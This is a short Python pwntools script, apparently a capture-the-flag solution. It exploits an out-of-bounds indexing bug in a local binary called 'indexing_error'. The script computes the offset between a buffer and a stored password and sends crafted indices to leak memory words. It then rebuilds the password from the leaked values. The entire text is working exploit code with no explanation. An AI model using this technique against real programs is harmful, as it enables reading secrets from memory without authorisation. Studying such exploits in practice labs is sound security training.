from pwn import *

pw_off = -0x10A0
buf_off = -0xFA0

index = (pw_off - buf_off)/4

p = process('./indexing_error', raw=False) # raw=False required for WSL

print 'Sending index'

pw_str = ''
for i in range(8):
    p.send(str(index + i))
    pw_txt = p.recv(timeout = 0.1)
    try:
        pw_str += p32(int(pw_txt[-12:-4],16))
    except:
        pass

print pw_str